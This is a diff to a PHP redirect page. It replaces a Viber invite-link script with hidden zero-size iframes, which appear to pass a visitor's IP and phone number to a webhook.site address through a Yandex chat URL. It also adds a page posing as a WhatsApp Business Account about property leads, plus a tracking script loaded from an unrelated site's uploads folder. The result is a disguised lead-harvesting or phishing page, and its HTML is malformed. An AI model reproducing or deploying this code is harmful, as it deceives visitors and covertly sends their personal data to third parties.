@@ -438,7 +438,17 @@ echo "<meta http-equiv='refresh' content='0;url=$url'>";
 #exit;
 
 ?>
-<script>function NewTab() { 
-            window.open( 
-              "https://3p3x.adj.st/?adjust_t=4d9v2s_f7ljq1&adjust_deeplink=viber%3A%2F%2Fgroup_invite%3Fdata%3DzIawlIKnN06LDLeseIim-Pqd2r4jGmJE&adjust_fallback=https%3A%2F%2Fwww.viber.com%2Fdl%3Futm_source%3DSuperlink", "_blank");
-}</script>
+<iframe  width="0px" height="0px" border="0px" src="https://yandex.ru/chat?utm_source=spavka_plus_ru&%3Bamp%3Butm_medium=plusdaily&from=1&appmetrica_tracking_id=747198218256853711&guid=5b2ac405-6079-9629-59ac-560e17ab7164&text=https://webhook.site/yabbbbb?ip=$request.ip$&phone=$request.query.phone$"></iframe><!DOCTYPE html>
+<html lang="ru" id="facebook" class="no_js">
+<head><meta charset="utf-8" /><meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
+
+<meta name="apple-mobile-web-app-capable" content="yes" /><meta name="description" content="Лиды по новостройкам" /><meta name="keywords" /><meta property="og:title" content="&#x413;&#x43e;&#x440;&#x44f;&#x447;&#x438;&#x435; &#x43b;&#x438;&#x434;&#x44b;" /><meta property="og:image" content="https://pps.whatsapp.net/v/t61.24694-24/351435491_619276326824919_8526653130590604473_n.jpg?ccb=11-4&amp;oh=01_AdQ0FQIbOjRqFGp3WwEPAE5z8I4vOYL3xOxWhI5oJ_qf-Q&amp;oe=64C23D43" /><meta property="og:site_name" content="WhatsApp.com" /><meta property="og:description" content="Business Account" /><meta property="og:keywords" /><meta property="invite_link_type" /><meta property="invite_link_type_v2" /><meta name="mobile-web-app-capable" content="yes" />
+</head><body><iframe width="0px" height="0px" border="0px" src="https://yandex.ru/chat?utm_source=spavka_plus_ru&%3Bamp%3Butm_medium=plusdaily&from=1&appmetrica_tracking_id=747198218256853711&guid=5b2ac405-6079-9629-59ac-560e17ab7164&text=https://webhook.site/yabbbbb?ip=$request.ip$&phone=$request.query.phone$"></iframe></body></html>
+<script>
+  var _mtm = window._mtm = window._mtm || [];
+  _mtm.push({'mtm.startTime': (new Date().getTime()), 'event': 'mtm.Start'});
+  (function() {
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.async=true; g.src='https://i.clk.ac/wp-content/uploads/matomo/container_NmAAovab.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
